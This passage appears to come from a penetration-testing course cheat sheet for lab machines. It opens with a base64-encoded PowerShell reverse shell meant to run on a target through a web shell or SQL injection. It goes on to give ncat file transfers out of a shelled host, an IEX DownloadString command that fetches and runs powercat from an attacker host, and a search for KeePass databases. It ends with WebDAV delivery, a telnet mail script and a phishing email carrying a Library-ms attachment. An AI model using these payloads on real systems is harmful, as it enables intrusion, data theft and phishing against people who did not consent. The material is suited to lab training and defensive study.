┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

--- PS END ---


# To exec on target (Great for web-shell upgrades or SQLi os commands)

powershell -enc JABjAGwAaQBlAG4A...
```

#### Useful Commands Once Shelled

##### Linux

###### Seach files from shell
```
find /path/to/search -name 'file.txt'
```

###### Recieve file transfer via Ncat listener *(Windows A.1)*
```bash
┌──(operator㉿labhost)-[~/OffSec/client-side]
└─$ nc -nvlp 4444 > outfile.txt
```


###### Transfer a file, receiver listens *(Windows A.1)*
```
host2$ ncat -l > outputfile
host1$ ncat --send-only host2 < inputfile
```

###### Send a File Transfer
```bash
┌──(operator㉿labhost)-[~/OffSec/client-side]
└─$ ncat 192.168.212.196 4445 < mymacro.doc
```


###### Transfer a file, sender listens
```
host1$ ncat -l --send-only < inputfile
host2$ ncat host1 > outputfile
```

##### Windows

###### Powershell File Search
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```
- User PowerShell.
	- [Get-ChildItem](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem)
 - Search the whole drive with `-Path C:\`
 - Specify file type with `-Include`
 - Get a list of files and sub dirs with `-File` and `-Recurse`
	- Silence errors and cont exec with `-ErrorAction` set to `SilentlyContinue`

###### MD5 Sum in PowerShell
```powershell
PS C:\Users\offsec> Get-FileHash .\Desktop\file.txt -Algorithm MD5
```

###### Network file transfer to Ncat listener with powercat.ps1 loaded via network *(Linux A.1)*
```powershell
PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -c 192.168.45.223 -p 4444 -i .\Desktop\infile.txt -v

PS C:\Users\offsec> IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.223/powercat.ps1');powercat -l -p 4444 -of C:\file.txt -v
```

---

#### Delivery Mechanisms

##### Linux

###### WebDAV
Install `wsgidav` from `apt` or `pip`
```bash
┌──(operator㉿labhost)-[~/OffSec/]
└─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/webdav
```

###### HTTP
```bash
┌──(operator㉿labhost)-[~/]
└─$ python -m http.server -d path/to/serve 8080 
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

---

#### Appendix

##### Appendix A.1

###### CLI Telnet SMTP Mail Client with Attachment
```
#!/bin/bash

# User input to compose email
read -p "[*] Enter target mail server URL or IP: " SERVER
read -p "[*] Enter submission port #: " PORT
read -p "[*] Enter sender mail server URL: " ORIGIN
read -p "[*] Enter email address for auth: " SENDER
read -p "[*] Enter password for auth: " PASSWD
read -p "[*] Enter recipient email address: " RECIPIENT
read -p "[*] Enter message subject: " SUBJECT
read -p "[*] Enter message body: " BODY
read -p "[*] Path to attachment (Enter if none)?: " FILE

# Base64 encode username, password, and file attachment (if any)
ENCU=$(printf "$SENDER" | base64);
ENCP=$(printf "$PASSWD" | base64);

# Check vars
sleep 0.5;
echo "[$] Preparing email..."
echo "[+] Target mail server: $SERVER"
echo "[+] Port: $PORT"
echo "[+] Sending mail server: $ORIGIN"
echo "[+] Sender: $SENDER"
echo "[+] Passwd: $PASSWD"
echo "[+] Base64 Username: $ENCU"
echo "[+] Base64 Password: $ENCP"
echo "[+] Recipient: $RECIPIENT"
echo "[+] Subject: $SUBJECT"
echo "[+] Body: $BODY"
if [ ! -z "$FILE" ]
then
    echo "[+] File attachment: $FILE"
    echo "[+] Base64 file string: $ENCF"
fi

# Telnet session
{
sleep 2;
echo "EHLO $ORIGIN"
sleep 2;
echo "AUTH LOGIN"
sleep 2;
echo "$ENCU"
sleep 2;
echo "$ENCP"
sleep 2;
echo "MAIL FROM: $SENDER"
sleep 2;
echo "RCPT TO: $RECIPIENT"
sleep 2;
echo "DATA"
sleep 2;
echo "Subject: $SUBJECT"
sleep 2;
if [ ! -z "$FILE" ]
then
    echo "Content-Type: multipart/mixed; boundary="x-=-segment sep""
    sleep 2;
    echo ""
    sleep 2;
    echo "This is a MIME formatted message.  If you see this text it means that your"
    sleep 2;
    echo "email software does not support MIME formatted messages."
    sleep 2;
    echo "--x-=-segment sep"
    sleep 2;
    echo "Content-Type: text/plain; charset=UTF-8; format=flowed"
    sleep 2;
    echo "Content-Disposition: inline"
    sleep 2;
fi
echo ""
sleep 2;
echo $BODY
sleep 2;
echo ""
sleep 2;
if [ ! -z "$FILE" ]
then
    echo "--x-=-segment sep"
    sleep 2;
    echo "Content-Type: file --mime-type -b $FILE; name=$FILE"
    sleep 2;
    echo "Content-Transfer-Encoding: base64"
    sleep 2;
    echo "Content-Disposition: attachment; filename="$FILE";"
    sleep 2;
    echo ""
    sleep 2;
    for SEG in $(base64 $FILE)
    do
        echo "$SEG"
    done
    sleep 2;
    echo ""
    sleep 2;
    echo "--x-=-segment sep--"
    sleep 2;
fi
echo "."
sleep 2;
echo "QUIT"
sleep 4;
} | telnet $SERVER $PORT

echo "[-] Exit with status: $?"
```

###### Example of Library-ms sent via Win Mail Client
```
Return-Path: test@supermagicorg.com
Received: from smtp.supermagicorg.com (Unknown [192.168.45.223])
	by ADMIN with ESMTPA
	; Sat, 9 Sep 2023 15:08:54 -0700
Message-ID: <61727A3C-5FAC-4DDC-8590-7199969083FC@ADMIN>

Subject: Test email

Content-Type: multipart/mixed; boundary=----------5bXWLJjHEcPk2U7KNqSl

This is a MIME formatted message.  If you see this text it means that your
email software does not support MIME formatted messages.

----------5bXWLJjHEcPk2U7KNqSl
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Disposition: inline

test 1, 2, 3


----------5bXWLJjHEcPk2U7KNqSl
Content-Type: file --mime-type -b config.Library-ms; name=config.Library-ms
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=config.Library-ms;

PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxsaWJyYXJ5RGVzY3JpcHRp b24geG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA5L2xpYnJh cnkiPg0KPG5hbWU+QHdpbmRvd3Muc3RvcmFnZS5kbGwsLTM0NTgyPC9uYW1lPg0KPHZlcnNpb24+ NjwvdmVyc2lvbj4NCjxpc0xpYnJhcnlQaW5uZWQ+dHJ1ZTwvaXNMaWJyYXJ5UGlubmVkPg0KPGlj b25SZWZlcmVuY2U+aW1hZ2VyZXMuZGxsLC0xMDAzPC9pY29uUmVmZXJlbmNlPg0KPHRlbXBsYXRl SW5mbz4NCjxmb2xkZXJUeXBlPns3ZDQ5ZDcyNi0zYzIxLTRmMDUtOTlhYS1mZGMyYzk0NzQ2NTZ9 PC9mb2xkZXJUeXBlPg0KPC90ZW1wbGF0ZUluZm8+DQo8c2VhcmNoQ29ubmVjdG9yRGVzY3JpcHRp b25MaXN0Pg0KPHNlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0KPGlzRGVmYXVsdFNhdmVMb2Nh dGlvbj50cnVlPC9pc0RlZmF1bHRTYXZlTG9jYXRpb24+DQo8aXNTdXBwb3J0ZWQ+ZmFsc2U8L2lz U3VwcG9ydGVkPg0KPHNpbXBsZUxvY2F0aW9uPg0KPHVybD5odHRwOi8vMTkyLjE2OC40NS4yMjM8 L3VybD4NCjwvc2ltcGxlTG9jYXRpb24+DQo8L3NlYXJjaENvbm5lY3RvckRlc2NyaXB0aW9uPg0K PC9zZWFyY2hDb25uZWN0b3JEZXNjcmlwdGlvbkxpc3Q+DQo8L2xpYnJhcnlEZXNjcmlwdGlvbj4=


----------5bXWLJjHEcPk2U7KNqSl

.
```
